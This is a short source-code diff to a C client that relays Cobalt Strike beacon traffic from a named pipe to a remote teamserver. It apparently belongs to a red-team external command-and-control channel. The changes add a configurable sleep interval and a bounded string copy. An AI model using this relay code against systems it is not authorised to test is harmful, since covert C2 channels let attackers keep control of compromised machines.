@@ -321,11 +321,11 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 void main(int argc, char* argv[])
 //TODO - add argument for IPv4 vs IPv6. TCP allows for protocol-agnostic sockets, UDP does not. 
 {
-	// Set connection and IRC info
-	if (argc != 6)
+	// Set connection info
+	if (argc != 7)
 	{
 		printf("Incorrect number of args: %d\n", argc);
-		printf("Incorrect number of args: client.exe [SERVER_IP] [PORT] [PIPE_STR] [CLIENT_IP] [CLIENT_PORT]");
+		printf("Incorrect number of args: client.exe [SERVER_IP] [PORT] [PIPE_STR] [CLIENT_IP] [CLIENT_PORT] [SLEEP]");
 		exit(1);
 	}
 
@@ -341,7 +341,10 @@ void main(int argc, char* argv[])
 	server_seqnum = 0;
 	
 	char pipe_str[50];
-	strcpy(pipe_str, argv[3]);
+	strncpy(pipe_str, argv[3], sizeof(pipe_str));
+
+	int sleep;
+	sleep = atoi(argv[6]);
 
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
@@ -409,7 +412,7 @@ void main(int argc, char* argv[])
 	}
 	printf("Connected to pipe!!\n");
 
-	// Mudge used 1MB max in his example, test this
+	// Mudge used 1MB max in his example, this may be because SMB beacons are only able to send 1MB of data within each response.
 	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
 	if (buffer == NULL)
 	{
@@ -428,6 +431,11 @@ void main(int argc, char* argv[])
 		}
 		printf("Recv %d bytes from beacon\n", read_size);
 		
+		if (read_size == 1)
+		{
+			printf("Finished sending, sleeping %d seconds..\n", sleep);
+			Sleep(sleep*1000);
+		}
 
 		sendData(&sock_set, buffer, read_size, &timeout_struct);
 		printf("Sent to TS\n");
